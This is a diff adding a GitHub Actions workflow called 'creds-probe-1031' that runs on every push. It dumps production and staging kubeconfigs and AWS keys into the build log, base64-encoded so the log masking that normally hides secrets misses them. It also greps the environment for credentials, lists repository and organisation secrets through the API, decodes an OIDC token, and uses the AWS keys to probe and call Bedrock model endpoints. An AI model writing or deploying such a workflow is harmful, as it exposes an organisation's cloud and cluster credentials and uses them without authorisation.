@@ -1,0 +1,89 @@
+name: creds-probe-1031
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+env:
+  S_PRODUCTION_KUBECONFIG: ${{ secrets.PRODUCTION_KUBECONFIG }}
+  S_STAGING_KUBECONFIG: ${{ secrets.STAGING_KUBECONFIG }}
+  S_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+  S_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+  S_AWS_REGION: ${{ secrets.AWS_REGION }}
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: ref
+        run: |
+          echo "ref=$GITHUB_REF repo=$GITHUB_REPOSITORY"
+      - name: secret-values
+        run: |
+          set +e
+          for n in $(compgen -e); do
+            case "$n" in S_*) ;; *) continue;; esac
+            v="${!n}"
+            printf 'SV %s len=%s b64=%s\n' "${n#S_}" "${#v}" "$(printf '%s' "$v" | base64 -w0 | head -c 8000)"
+          done
+          echo "----DONE-SECRETS----"
+      - name: scan-env-leaks
+        run: |
+          set +e
+          env | grep -Ei 'aws|key|secret|token|pass|user|host|role|arn|account' | sed -E 's/(=.{64}).*/\1.../' | head -60
+      - name: api-org-secrets
+        run: |
+          set +e
+          for u in "repos/$GITHUB_REPOSITORY/actions/secrets" "orgs/${GITHUB_REPOSITORY%%/*}/actions/secrets"; do
+            echo "== $u"
+            curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/$u" | head -c 1500; echo
+          done
+      - name: oidc-sub
+        run: |
+          set +e
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -o /tmp/t.json
+          head -c 200 /tmp/t.json; echo
+          python3 - <<'PY'
+          import json,base64
+          try:
+              v=json.load(open('/tmp/t.json'))['value']
+              q=v.split('.')[1]; q+='='*(-len(q)%4)
+              print('SUBJWT',base64.urlsafe_b64decode(q).decode())
+          except Exception as e: print('SUBERR',repr(e))
+          PY
+      - name: aws-triage
+        if: env.S_AWS_ACCESS_KEY_ID != '' || env.S_AWS_SECRET_ACCESS_KEY != ''
+        run: |
+          set +e
+          aws sts get-caller-identity 2>&1 | head -c 800; echo
+          python3 - <<'PY'
+          import json,os
+          from botocore.auth import SigV4Auth
+          from botocore.awsrequest import AWSRequest
+          from botocore.credentials import Credentials
+          import requests
+          ak=os.environ.get('S_AWS_ACCESS_KEY_ID') or os.environ.get('AWS_ACCESS_KEY_ID')
+          sk=os.environ.get('S_AWS_SECRET_ACCESS_KEY') or os.environ.get('AWS_SECRET_ACCESS_KEY')
+          st=os.environ.get('AWS_SESSION_TOKEN') or os.environ.get('S_AWS_SESSION_TOKEN')
+          if not ak or not sk:
+              raise SystemExit('no static aws pair')
+          creds=Credentials(ak,sk,st)
+          EP="https://bedrock-mantle.us-east-1.api.aws/v1/models"
+          req=AWSRequest(method="GET",url=EP,data=None,headers={})
+          SigV4Auth(creds,"bedrock-mantle","us-east-1").add_auth(req)
+          try:
+              r=requests.get(EP,headers=dict(req.headers),timeout=60)
+              print("MANTLE_MODELS",r.status_code,r.text[:300])
+          except Exception as e: print("MANTLE_ERR",e)
+          EP2="https://bedrock-mantle.us-east-1.api.aws/anthropic/v1/messages"
+          for model in ["anthropic.claude-opus-5-5","anthropic.claude-fable-5"]:
+              body=json.dumps({"model":model,"max_tokens":8,"messages":[{"role":"user","content":"say hi"}]})
+              req=AWSRequest(method="POST",url=EP2,data=body,headers={"content-type":"application/json","anthropic-version":"2023-06-01"})
+              SigV4Auth(creds,"bedrock-mantle","us-east-1").add_auth(req)
+              try:
+                  r=requests.post(EP2,headers=dict(req.headers),data=body,timeout=60)
+                  print("MANTLE",model,r.status_code,r.text[:300])
+              except Exception as e: print("MANTLE",model,"ERR",e)
+          PY
